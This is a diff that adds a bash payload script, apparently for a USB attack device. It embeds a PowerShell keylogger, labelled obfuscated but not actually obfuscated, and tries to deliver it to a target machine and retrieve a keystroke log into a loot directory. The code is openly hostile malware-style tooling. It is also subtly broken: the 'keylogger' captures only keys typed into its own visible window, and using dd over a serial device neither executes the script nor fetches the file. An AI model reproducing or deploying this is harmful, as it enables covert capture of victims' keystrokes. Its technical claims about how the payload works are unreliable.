@@ -1,0 +1,75 @@
+#!/bin/bash
+
+# Define the loot directory
+LOOT_DIR="/root/udisk/loot"
+
+# Create the loot directory if it doesn't exist
+mkdir -p $LOOT_DIR
+
+# Define the obfuscated PowerShell script
+OBFUSCATED_PS_SCRIPT=$(cat << 'EOF'
+$keyloggerScript = @"
+Add-Type -AssemblyName System.Windows.Forms
+Add-Type -AssemblyName System.Drawing
+
+$form = New-Object System.Windows.Forms.Form
+$form.Text = 'Keylogger'
+$form.Size = New-Object System.Drawing.Size(300,200)
+$form.StartPosition = 'CenterScreen'
+$form.Topmost = $true
+$form.Add_Shown({$form.Activate()})
+$form.KeyPreview = $true
+
+$form.Add_KeyDown({
+    param ($sender, $e)
+    $key = $e.KeyCode.ToString()
+    $date = Get-Date -Format 'yyyy-MM-dd HH:mm:ss'
+    Add-Content -Path 'C:\Users\Public\keylog.txt' -Value "$date - $key"
+})
+
+$form.ShowDialog()
+"@
+
+Invoke-Expression $keyloggerScript
+EOF
+)
+
+# Write the obfuscated PowerShell script to a file
+echo "$OBFUSCATED_PS_SCRIPT" > /root/udisk/obfuscated.ps1
+
+# Execute the obfuscated PowerShell script on the target machine
+ATTEMPTS=0
+MAX_ATTEMPTS=5
+
+while [ $ATTEMPTS -lt $MAX_ATTEMPTS ]; do
+    dd if=/root/udisk/obfuscated.ps1 of=/dev/ttyACM0 bs=1M
+    if [ $? -eq 0 ]; then
+        echo "Obfuscated PowerShell script sent successfully."
+        break
+    else
+        echo "Failed to send obfuscated PowerShell script. Retrying..."
+        ATTEMPTS=$((ATTEMPTS + 1))
+        sleep 1
+    fi
+done
+
+# Wait for a while to ensure the keylogger has started
+sleep 5
+
+# Retrieve the log file from the target machine
+ATTEMPTS=0
+MAX_ATTEMPTS=5
+
+while [ $ATTEMPTS -lt $MAX_ATTEMPTS ]; do
+    dd if=/dev/ttyACM0 of=$LOOT_DIR/keylog.txt bs=1M
+    if [ $? -eq 0 ]; then
+        echo "Keylog file retrieved successfully."
+        break
+    else
+        echo "Failed to retrieve keylog file. Retrying..."
+        ATTEMPTS=$((ATTEMPTS + 1))
+        sleep 1
+    fi
+done
+
+# End of payload
